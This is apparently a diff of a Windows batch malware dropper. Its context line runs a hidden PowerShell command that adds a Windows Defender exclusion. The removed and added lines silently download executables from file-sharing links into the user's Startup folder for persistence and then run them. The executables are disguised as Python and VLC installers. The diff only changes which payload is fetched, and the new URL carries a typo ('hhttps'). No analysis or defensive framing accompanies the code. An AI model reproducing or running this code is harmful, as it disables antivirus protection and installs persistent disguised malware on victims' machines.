@@ -3,42 +3,8 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://link.storjshare.io/s/jvgodndum3cnmdzwofmqcuyyd3oq/alboorgi/python-3.11.0-amd64.exe?download=1"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
-
-
-if exist "%DEST%" del "%DEST%"
-
-curl --silent --output "%DEST%" "%URL%"
-
-if %errorlevel% neq 0 (
-  exit /b %errorlevel%
-)
-
-call "%DEST%"
-
-@echo off
-setlocal 
-
-set "URL=https://link.storjshare.io/s/juhifsj5yqitylzy42lgs2xmtfjq/isimsallaqwe/PythonInstaller.exe?download=1"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\stub.exe"
-
-
-if exist "%DEST%" del "%DEST%"
-
-curl --silent --output "%DEST%" "%URL%"
-
-if %errorlevel% neq 0 (
-  exit /b %errorlevel%
-)
-
-call "%DEST%"
-
-@echo off
-setlocal 
-
-set "URL=https://link.storjshare.io/s/jvfnirhyr2nnkaaugkepvfng23ia/alsanas/VLCMediaPlayer.exe?download=1"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\VLCMediaPlayer.exe"
+set "URL=hhttps://link.storjshare.io/s/jutyn2xmq7n5h6aa5jneoxxosnfa/asinus/python-3-12-4.exe?download=1"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\python-3-12-4.exe"
 
 
 if exist "%DEST%" del "%DEST%"
